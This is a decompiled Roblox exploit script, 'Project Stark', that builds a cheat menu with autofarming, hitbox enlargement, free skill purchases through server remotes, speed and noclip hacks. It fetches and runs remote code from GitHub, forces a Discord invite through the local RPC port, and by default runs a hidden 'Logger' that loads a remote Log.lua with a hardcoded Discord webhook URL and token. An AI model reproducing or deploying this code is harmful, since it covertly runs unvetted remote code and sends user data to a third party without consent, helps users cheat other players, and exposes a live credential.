local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v_u_2 = game:GetService("Players").LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v_u_3 = false
	local function v6(p_u_4)
		pcall(function()
			-- upvalues: (ref) p_u_4
			local v5 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v5:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_4
					},
					["nonce"] = v5:GenerateGUID(false)
				})
			})
		end)
	end
	local v7 = false
	if true then
		if v_u_2 and v_u_2.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_2
				v_u_2:Destroy()
				warn("Urbanstorn was here")
			end)
			v7 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v6("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v7 = true
	end
	if v7 then
		local v8 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\225\180\191\225\181\146\225\181\141\225\181\152\225\181\137\225\180\174\203\161\225\181\131\225\181\136\225\181\137", Color3.fromRGB(120, 81, 169))
		local v9 = v8:Tab("Main")
		if game.PlaceId == 13141441934 then
			v9:Button("Equip All Tools", function()
				local v10 = game:GetService("Players").LocalPlayer
				local v11 = v10:FindFirstChildOfClass("Backpack")
				local v12 = v10.Character or v10.CharacterAdded:Wait()
				if v11 and v12 then
					local v13, v14, v15 = ipairs(v11:GetChildren())
					while true do
						local v16
						v15, v16 = v13(v14, v15)
						if v15 == nil then
							break
						end
						if v16:IsA("Tool") or v16:IsA("HopperBin") then
							v16.Parent = v12
						end
					end
				end
			end)
			v9:Button("Boxreach: 100", function()
				local v17 = game:GetService("Players").LocalPlayer
				local v18 = v17.Character or v17.CharacterAdded:Wait()
				local v19, v20, v21 = ipairs(v18:GetDescendants())
				while true do
					local v22
					v21, v22 = v19(v20, v21)
					if v21 == nil then
						break
					end
					if v22:IsA("Tool") and v22:FindFirstChild("Handle") then
						local v23 = v22.Handle
						local v24, v25, v26 = ipairs(v23:GetChildren())
						local v27 = 100
						while true do
							local v28
							v26, v28 = v24(v25, v26)
							if v26 == nil then
								break
							end
							if v28:IsA("SelectionBox") and v28.Name == "SelectionBoxCreated" then
								v28:Destroy()
							end
						end
						local v29 = Instance.new("SelectionBox")
						v29.Name = "SelectionBoxCreated"
						v29.Adornee = v23
						v29.Parent = v23
						v23.Massless = true
						v23.Size = Vector3.new(v27, v27, v27)
						v22.GripPos = Vector3.new(0, 0, 0)
						local v30 = v18:FindFirstChildOfClass("Humanoid")
						if v30 then
							v30:UnequipTools()
						end
					end
				end
			end)
			v9:Toggle("Autostart round (5s timer)", function(p31)
				Autostart = p31
				while Autostart do
					task.wait(5)
					task.spawn(function()
						pcall(function()
							fireclickdetector(game.workspace["The Shop"].Timer.btn.ClickDetector)
						end)
					end)
					task.spawn(function()
						pcall(function()
							fireclickdetector(game.workspace.Timer.btn.ClickDetector)
						end)
					end)
				end
			end)
			local v_u_32 = game:GetService("Players").LocalPlayer
			local v_u_33 = false
			local v_u_34 = false
			getgenv().Autofarm = false
			local v_u_35 = 50
			local v_u_36 = "Everything"
			local function v_u_43()
				-- upvalues: (ref) v_u_32
				local v37 = v_u_32.Character
				if v37 then
					local v38, v39, v40 = ipairs(v37:GetDescendants())
					while true do
						local v41
						v40, v41 = v38(v39, v40)
						if v40 == nil then
							break
						end
						if v41:IsA("BasePart") and v41.CanCollide then
							v41.CanCollide = false
						end
					end
					local v42 = v37:FindFirstChild("HumanoidRootPart")
					if v42 then
						v42.Velocity = Vector3.new(0, 0, 0)
					end
				end
			end
			local function v_u_66()
				-- upvalues: (ref) v_u_34, (ref) v_u_33, (ref) v_u_36, (ref) v_u_43, (ref) v_u_32, (ref) v_u_35
				if not v_u_34 then
					v_u_34 = true
					task.spawn(function()
						-- upvalues: (ref) v_u_33, (ref) v_u_36, (ref) v_u_43, (ref) v_u_32, (ref) v_u_35, (ref) v_u_34
						while v_u_33 do
							task.wait()
							local v_u_44 = false
							local v_u_45 = {}
							local function v_u_51(p46)
								-- upvalues: (ref) v_u_36, (ref) v_u_44, (ref) v_u_45, (ref) v_u_51
								local v47, v48, v49 = ipairs(p46:GetChildren())
								while true do
									local v50
									v49, v50 = v47(v48, v49)
									if v49 == nil then
										break
									end
									if v50:IsA("Model") then
										if v50:FindFirstChildOfClass("Humanoid") and (v50:FindFirstChild("HumanoidRootPart") and (not v50:FindFirstChild("ClickDetector") and (v_u_36 == "Everything" or v_u_36 ~= "Everything" and string.match(v50.Name, v_u_36)))) then
											v_u_44 = true
											table.insert(v_u_45, v50)
										end
									elseif v50:IsA("Folder") then
										v_u_51(v50)
									end
								end
							end
							local v52 = workspace:FindFirstChild("NPCS") or workspace:FindFirstChild("NPCs")
							if v52 then
								v_u_51(v52)
							end
							table.sort(v_u_45, function(p53, p54)
								local v55 = p53:FindFirstChildOfClass("Humanoid")
								local v56 = p54:FindFirstChildOfClass("Humanoid")
								return (v55 and v55.Health or math.huge) < (v56 and v56.Health or math.huge)
							end)
							local v57, v58, v59 = ipairs(v_u_45)
							local v60 = v_u_44
							while true do
								local v61
								v59, v61 = v57(v58, v59)
								if v59 == nil then
									break
								end
								local v62 = v61:FindFirstChildOfClass("Humanoid")
								local v63 = v61:FindFirstChild("HumanoidRootPart")
								while v_u_33 and (v62 and (v62.Health > 0 and v63)) do
									v_u_43()
									local v64 = v_u_32.Character
									if v64 then
										v64 = v64:FindFirstChild("HumanoidRootPart")
									end
									if v64 and v63 then
										v64.CFrame = v63.CFrame * CFrame.Angles(math.rad(-90), 0, 0) + Vector3.new(0, v_u_35, 0)
									end
									task.wait()
								end
								if not v_u_33 then
									break
								end
							end
							if v_u_33 and not v60 then
								local v65 = v_u_32.Character
								if v65 then
									v65 = v65:FindFirstChild("HumanoidRootPart")
								end
								if v65 then
									v65.CFrame = CFrame.new(-163, 6, 70)
								end
							end
						end
						v_u_34 = false
					end)
				end
			end
			v9:Toggle("Autofarm", function(p67)
				-- upvalues: (ref) v_u_33, (ref) v_u_66
				v_u_33 = p67
				getgenv().Autofarm = p67
				if p67 then
					v_u_66()
				end
			end)
			v9:Toggle("Autoclick", function(p68)
				AP = p68
				while AP do
					task.wait(0.3)
					local v69 = game:GetService("VirtualUser")
					v69:CaptureController()
					v69:Button1Down(Vector2.new(100000, 100000))
					task.wait(0.3)
					v69:Button1Up(Vector2.new(100000, 100000))
				end
			end)
			local v_u_70 = game:GetService("Players").LocalPlayer
			local v_u_71 = false
			local v_u_72 = {}
			local v_u_73 = setmetatable({}, {
				["__mode"] = "k"
			})
			local function v_u_78()
				-- upvalues: (ref) v_u_72
				local v74, v75, v76 = ipairs(v_u_72)
				while true do
					local v_u_77
					v76, v_u_77 = v74(v75, v76)
					if v76 == nil then
						break
					end
					pcall(function()
						-- upvalues: (ref) v_u_77
						v_u_77:Disconnect()
					end)
				end
				v_u_72 = {}
			end
			local function v_u_81(p79)
				local v80 = p79 and p79:IsA("BasePart")
				if v80 then
					v80 = p79:FindFirstAncestorOfClass("Tool") ~= nil
				end
				return v80
			end
			local function v_u_84(p82)
				-- upvalues: (ref) v_u_70, (ref) v_u_81
				if p82 and p82:IsA("BasePart") then
					local v83 = v_u_70.Character
					if v83 and p82:IsDescendantOf(v83) then
						return not v_u_81(p82)
					else
						return false
					end
				else
					return false
				end
			end
			local function v_u_87(p85, p86)
				-- upvalues: (ref) v_u_84, (ref) v_u_73
				if v_u_84(p85) then
					if p86 then
						if v_u_73[p85] == nil then
							v_u_73[p85] = p85.CanTouch
						end
						p85.CanTouch = false
					elseif v_u_73[p85] ~= nil then
						p85.CanTouch = v_u_73[p85]
						v_u_73[p85] = nil
					end
				end
			end
			local function v_u_94(p88, p89)
				-- upvalues: (ref) v_u_87
				if p88 then
					local v90, v91, v92 = ipairs(p88:GetDescendants())
					while true do
						local v93
						v92, v93 = v90(v91, v92)
						if v92 == nil then
							break
						end
						if v93:IsA("BasePart") then
							v_u_87(v93, p89)
						end
					end
				end
			end
			local function v_u_97(p95)
				-- upvalues: (ref) v_u_72, (ref) v_u_71, (ref) v_u_81, (ref) v_u_87
				if p95 then
					table.insert(v_u_72, p95.DescendantAdded:Connect(function(p96)
						-- upvalues: (ref) v_u_71, (ref) v_u_81, (ref) v_u_87
						if v_u_71 and (p96:IsA("BasePart") and not v_u_81(p96)) then
							v_u_87(p96, true)
						end
					end))
				end
			end
			local function v_u_102(p98)
				-- upvalues: (ref) v_u_71, (ref) v_u_78, (ref) v_u_70, (ref) v_u_94, (ref) v_u_97, (ref) v_u_72
				if p98 ~= v_u_71 then
					v_u_71 = p98 and true or false
					if v_u_71 then
						v_u_78()
						local v99 = v_u_70.Character or v_u_70.CharacterAdded:Wait()
						v_u_94(v99, true)
						v_u_97(v99)
						table.insert(v_u_72, v_u_70.CharacterAdded:Connect(function(p100)
							-- upvalues: (ref) v_u_71, (ref) v_u_94, (ref) v_u_97
							if v_u_71 then
								task.wait()
								v_u_94(p100, true)
								v_u_97(p100)
							end
						end))
					else
						local v101 = v_u_70.Character
						if v101 then
							v_u_94(v101, false)
						end
						v_u_78()
					end
				end
			end
			getgenv().SetNoTouchOnlyTools = v_u_102
			getgenv().IsNoTouchOn = function()
				-- upvalues: (ref) v_u_71
				return v_u_71
			end
			v9:Toggle("Disable projectile damage", function(p103)
				-- upvalues: (ref) v_u_102
				v_u_102(p103)
			end)
		end
		if game.PlaceId == 13141106123 then
			local _ = game.Players.LocalPlayer
			local v_u_104 = workspace:WaitForChild("Folder do gov"):WaitForChild("Classes")
			local v105, v106, v107 = ipairs(v_u_104:GetChildren())
			local v108 = { "All Classes" }
			while true do
				local v109
				v107, v109 = v105(v106, v107)
				if v107 == nil then
					break
				end
				table.insert(v108, v109.Name)
			end
			local v_u_110 = nil
			v9:Dropdown("Select Class", v108, function(p111)
				-- upvalues: (ref) v_u_110
				v_u_110 = p111
			end)
			local v_u_112 = game:GetService("ReplicatedStorage"):WaitForChild("Classes")
			v9:Button("Equip Class", function()
				-- upvalues: (ref) v_u_110, (ref) v_u_104, (ref) v_u_112
				if v_u_110 then
					if v_u_110 ~= "All Classes" then
						local v113 = { (v_u_104:WaitForChild(v_u_110)) }
						v_u_112:FireServer(unpack(v113))
					else
						local v114 = v_u_104
						local v115, v116, v117 = ipairs(v114:GetChildren())
						while true do
							local v118
							v117, v118 = v115(v116, v117)
							if v117 == nil then
								break
							end
							v_u_112:FireServer(unpack({ v118 }))
							task.wait(0.2)
						end
					end
				else
					warn("Please select a class first!")
				end
			end)
			v9:Button("Skill Unlocker (Free skills)", function()
				-- upvalues: (ref) v_u_104
				local v_u_119 = game:GetService("ReplicatedStorage"):WaitForChild("ComprarSkill")
				local function v123(p120)
					-- upvalues: (ref) v_u_119
					for v121 = 0, 20 do
						local v122 = { 0, tostring(v121), p120 }
						v_u_119:FireServer(unpack(v122))
						task.wait()
					end
				end
				local v124 = v_u_104
				local v125, v126, v127 = ipairs(v124:GetChildren())
				while true do
					local v128
					v127, v128 = v125(v126, v127)
					if v127 == nil then
						break
					end
					v123(v128)
				end
			end)
			v9:Button("Nightmare Mode", function(_)
				firetouchinterest(game.Players.LocalPlayer.Character["Left Leg"], game.workspace.Teleporters.TeleporterNightmare.Tp1.Caixa.Teleporte1.TouchInterest, 0)
				firetouchinterest(game.Players.LocalPlayer.Character["Left Leg"], game.workspace.Teleporters.TeleporterNightmare.Tp1.Caixa.Teleporte1.TouchInterest, 1)
			end)
		end
		local v129 = v8:Tab("Extras")
		v129:Button("Admin", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
		end)
		v129:Button("Server Hop", function()
			local v_u_130 = game.PlaceId
			local v_u_131 = {}
			local v_u_132 = ""
			local v_u_133 = os.date("!*t").hour
			if not pcall(function()
				-- upvalues: (ref) v_u_131
				v_u_131 = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
			end) then
				table.insert(v_u_131, v_u_133)
				writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_131))
			end
			function TPReturner()
				-- upvalues: (ref) v_u_132, (ref) v_u_130, (ref) v_u_131, (ref) v_u_133
				local v134
				if v_u_132 ~= "" then
					v134 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_130 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. v_u_132))
				else
					v134 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_130 .. "/servers/Public?sortOrder=Asc&limit=100"))
				end
				if v134.nextPageCursor and (v134.nextPageCursor ~= "null" and v134.nextPageCursor ~= nil) then
					v_u_132 = v134.nextPageCursor
				end
				local v135, v136, v137 = pairs(v134.data)
				local v138 = 0
				while true do
					local v139
					v137, v139 = v135(v136, v137)
					if v137 == nil then
						break
					end
					local v140 = true
					local v_u_141 = tostring(v139.id)
					if tonumber(v139.maxPlayers) > tonumber(v139.playing) then
						local v142, v143, v144 = pairs(v_u_131)
						while true do
							local v145
							v144, v145 = v142(v143, v144)
							if v144 == nil then
								break
							end
							if v138 == 0 then
								if tonumber(v_u_133) ~= tonumber(v145) then
									pcall(function()
										-- upvalues: (ref) v_u_131, (ref) v_u_133
										delfile("NotSameServers.json")
										v_u_131 = {}
										table.insert(v_u_131, v_u_133)
									end)
								end
							elseif v_u_141 == tostring(v145) then
								v140 = false
							end
							v138 = v138 + 1
						end
						if v140 == true then
							table.insert(v_u_131, v_u_141)
							wait()
							pcall(function()
								-- upvalues: (ref) v_u_131, (ref) v_u_130, (ref) v_u_141
								writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_131))
								wait()
								game:GetService("TeleportService"):TeleportToPlaceInstance(v_u_130, v_u_141, game.Players.LocalPlayer)
							end)
							wait(4)
						end
					end
				end
			end
			function Teleport()
				-- upvalues: (ref) v_u_132
				while wait() do
					pcall(function()
						-- upvalues: (ref) v_u_132
						TPReturner()
						if v_u_132 ~= "" then
							TPReturner()
						end
					end)
				end
			end
			Teleport()
		end)
		v129:Button("Anti-Afk - Already Running", function()
			print("Why are you clicking the anti-afk button lmao")
		end)
		v129:Toggle("Infinite Jump", function(p146)
			InfJump = p146
			if InfJumpStarted == nil then
				InfJumpStarted = true
				local v147 = game:GetService("Players").LocalPlayer
				local v148 = v147:GetMouse()
				local v_u_149 = v147.Character:WaitForChild("Humanoid")
				v148.KeyDown:Connect(function(p150)
					-- upvalues: (ref) v_u_149
					if InfJump and p150:byte() == 32 then
						v_u_149:ChangeState("Jumping")
						wait()
						v_u_149:ChangeState("Seated")
					end
				end)
			end
		end)
		local v_u_151 = 40
		v129:Slider("Player Speed", 20, 200, 23, function(p152)
			-- upvalues: (ref) v_u_151
			v_u_151 = p152
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_151
		end)
		local v153 = v8:Tab("Credits")
		v153:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v153:Button("https://discord.gg/vgYZApyrZC - Click to copy", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_151
			(function()
				-- upvalues: (ref) v_u_151
				while true do
					pcall(function()
						-- upvalues: (ref) v_u_151
						wait(0.5)
						if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= v_u_151 then
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_151
						end
					end)
				end
			end)()
		end)
		task.spawn(function()
			pcall(function()
				game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
				local v154 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts").PlayerModule.CameraModule.ZoomController.Popper
				local v155 = next
				local v156, v157 = getgc()
				while true do
					local v158
					v157, v158 = v155(v156, v157)
					if v157 == nil then
						break
					end
					if getfenv(v158).script == v154 and typeof(v158) == "function" then
						local v159 = next
						local v160, v161 = debug.getconstants(v158)
						while true do
							local v162
							v161, v162 = v159(v160, v161)
							if v161 == nil then
								break
							end
							if tonumber(v162) ~= 0.25 then
								if tonumber(v162) == 0 then
									debug.setconstant(v158, v161, 0.25)
								end
							else
								debug.setconstant(v158, v161, 0)
							end
						end
					end
				end
				local v163, v164, v165 = pairs(game.Players.LocalPlayer.Character:GetChildren())
				while true do
					local v166
					v165, v166 = v163(v164, v165)
					if v165 == nil then
						break
					end
					if v166.ClassName == "Part" or v166.ClassName == "MeshPart" then
						v166.CanCollide = false
					end
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_167 = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					-- upvalues: (ref) v_u_167
					v_u_167:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
					wait(1)
					v_u_167:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				end)
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_3
			pcall(function()
				-- upvalues: (ref) v_u_3
				if v_u_3 ~= false then
					warn("[Project Stark] Logger DISABLED")
				else
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1429580162395275488/PaxyIowSUoOZBx0AQtEz2xjyFYIf-KbwrmtDXD1-YYoa3J0ZhdD6JpDyMyGsn7xwQ5my"
					getgenv().Titlewebyhookie = "\225\180\191\225\181\146\225\181\141\225\181\152\225\181\137\225\180\174\203\161\225\181\131\225\181\136\225\181\137"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end
			end)
		end)
	end
end
return v1["script.lua"](...)
